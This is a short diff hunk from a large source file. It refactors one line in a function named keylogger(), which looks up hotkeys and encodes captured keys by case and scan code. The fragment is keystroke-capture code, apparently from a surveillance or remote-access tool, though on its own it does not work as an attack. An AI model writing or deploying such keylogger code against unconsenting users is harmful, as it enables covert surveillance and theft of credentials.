@@ -2092,7 +2092,7 @@ def keylogger():
                 continue
             
             key = kevent.name
-            hotkey = KEYBOARD_HOTKEY.get(kevent.name)
+            hotkey = KEYBOARD_HOTKEY.get(key)
 
             if hotkey is None:
                 key = (('U' if key.isupper() else 'L') + str(kevent.scan_code)) if key.isalpha() else key
